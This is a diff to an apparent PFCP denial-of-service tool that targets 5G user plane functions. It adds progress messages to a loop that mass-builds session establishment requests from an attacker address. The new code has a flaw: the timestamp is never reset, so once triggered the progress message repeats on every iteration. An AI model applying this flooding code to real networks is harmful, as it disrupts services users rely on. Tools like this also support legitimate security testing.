@@ -280,6 +280,9 @@ class PFCPDosAttack:
         print(f"[DoS] Preparing {count} PFCP session establishment packets")
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
         
+        start_time = time.time()
+        last_update = start_time
+        
         for i in range(count):
             self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
                 seid=self.new_seid(), 
@@ -288,6 +291,11 @@ class PFCPDosAttack:
                 random_seq=self.randomize,
                 random_far_number=29
                 ))
+            
+            now = time.time()
+            if now - last_update >= 5:
+                percent = (i + 1)* 100 // count
+                print(f"[DoS] Progress: {percent}% ({i+1}/{count})")
         print(f"[DoS] Prepared the PFCP association setup packet")
         print(f"[DoS] Prepared {count} PFCP session establishment packets")
                 
